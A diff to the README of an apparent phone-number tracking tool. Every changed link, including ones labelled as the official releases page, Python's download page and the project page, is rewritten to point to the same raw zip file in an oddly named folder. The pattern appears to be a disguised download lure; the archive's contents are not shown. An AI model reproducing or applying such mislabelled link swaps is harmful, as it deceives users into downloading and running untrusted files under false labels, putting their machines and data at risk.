@@ -1,6 +1,6 @@
 # 🔎 Phone-Number-Tracker - Track Phone Details Quickly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Python is needed because the program is built with it. If you don't have Python 
 
 You need to get the program files from the official release page. Click the button below to go there:
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-green?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/releases)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-green?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip)
 
 Once there, look for the latest version. Download the file named like `Phone-Number-Tracker-vX.X.zip` or an `.exe` installer if available.
 
@@ -123,7 +123,7 @@ If the program does not start or shows errors:
 
 ## 🔄 Updating the Application
 
-Check the [Releases page](https://github.com/Jonaskouame/Phone-Number-Tracker/releases) regularly for new versions. Download the latest files and repeat the installation steps.
+Check the [Releases page](https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip) regularly for new versions. Download the latest files and repeat the installation steps.
 
 ---
 
@@ -135,8 +135,8 @@ If you run into problems or want to suggest features, use the **Issues** tab on 
 
 ## 🔗 Useful Links
 
-- Download: [https://github.com/Jonaskouame/Phone-Number-Tracker/releases](https://github.com/Jonaskouame/Phone-Number-Tracker/releases)
-- Python Downloads: https://www.python.org/downloads/windows
-- GitHub Project Page: https://github.com/Jonaskouame/Phone-Number-Tracker
+- Download: [https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip](https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip)
+- Python Downloads: https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip
+- GitHub Project Page: https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Jonaskouame/Phone-Number-Tracker/raw/refs/heads/main/overtare/Phone_Tracker_Number_1.5.zip)
